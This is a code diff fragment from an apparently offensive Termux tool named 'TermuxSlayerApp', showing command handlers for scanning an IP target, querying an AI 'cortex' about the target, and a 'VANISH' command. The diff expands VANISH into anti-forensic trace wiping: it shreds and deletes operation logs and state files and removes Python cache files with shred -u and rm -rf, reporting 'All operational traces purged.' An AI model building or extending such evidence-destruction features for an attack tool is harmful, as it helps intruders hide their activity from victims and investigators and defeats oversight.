+                    self.add_log("No API key found. Use 'API <key>' or set GROQ_API_KEY env var.", "WARN")
         elif cmd == "SCAN":
             if not args: self.add_log("SCAN requires target (e.g., SCAN 192.168.1.1)", "WARN")
             else:
@@ -927,8 +855,22 @@ class TermuxSlayerApp:
                 self.add_log(f"Processing Demand: {q}", "AI")
                 threading.Thread(target=lambda: self.cortex.reason(q, {"target": self.target}), daemon=True).start()
         elif cmd == "VANISH":
-            if os.path.exists(SlayerConfig.LOG_FILE): os.system(f"shred -u {SlayerConfig.LOG_FILE}")
-            self.add_log("Traces purged.", "SUCCESS")
+            targets = [
+                SlayerConfig.LOG_FILE,
+                SlayerConfig.STATE_FILE,
+                os.path.join(SlayerConfig.BASE_DIR, "slayer_state.json"),
+                os.path.join(SlayerConfig.BASE_DIR, "slayer_ops.log"),
+            ]
+            for f in targets:
+                if os.path.exists(f): os.system(f"shred -u '{f}' 2>/dev/null; rm -f '{f}'")
+            # Clean Python cache files
+            pycache = os.path.join(SlayerConfig.BASE_DIR, "__pycache__")
+            if os.path.exists(pycache): os.system(f"rm -rf '{pycache}'")
+            for root, dirs, files in os.walk(SlayerConfig.BASE_DIR):
+                for f in files:
+                    if f.endswith(".pyc"):
+                        os.remove(os.path.join(root, f))
+            self.add_log("All operational traces purged.", "SUCCESS")
         elif cmd == "CONSULT":
             self.add_log("Initiating Batch Intelligence Analysis...", "AI")
             threading.Thread(target=self.cortex.consult, args=(self.target,), daemon=True).start()
